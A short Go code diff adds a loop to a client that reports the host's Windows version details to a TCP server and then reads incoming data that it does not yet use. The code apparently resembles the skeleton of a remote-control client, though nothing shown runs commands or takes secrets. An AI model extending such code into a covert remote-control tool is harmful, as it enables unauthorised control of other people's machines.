@@ -29,6 +29,17 @@ func connect() {
 	jsonBytes, err := json.Marshal(`{"type": "client","content": "` + osDetail + `"}`)
 	_, err = tcpServer.Write([]byte(jsonBytes))
 	checkError(err)
+	tcpClient(*tcpServer)
+}
+
+func tcpClient(client net.TCPConn) {
+	for {
+		var buf [1024]byte
+		n, err := client.Read(buf[:])
+		checkError(err)
+		var recv_data string = string(buf[:n])
+
+	}
 }
 
 func RtlGetNtVersionNumbers() (majorVersion, minorVersion, buildNumber uint32) {
